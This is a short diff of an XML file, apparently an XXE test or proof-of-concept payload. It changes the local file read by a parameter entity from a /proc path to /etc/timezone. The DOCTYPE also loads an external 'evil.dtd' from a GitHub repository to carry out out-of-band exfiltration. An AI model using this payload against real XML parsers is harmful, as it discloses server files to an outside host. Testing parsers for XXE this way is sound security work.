@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>                                          
 <!DOCTYPE xs:schema [                                                                               
-    <!ENTITY % file SYSTEM "file:///proc/self/cwd/java/openjdk/release">                                                      
+    <!ENTITY % file SYSTEM "file:///etc/timezone">                                                      
     <!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/pwntester/xxe/refs/heads/main/evil.dtd">                                  
     %dtd;                                                                                           
 ]>                                                                                                  
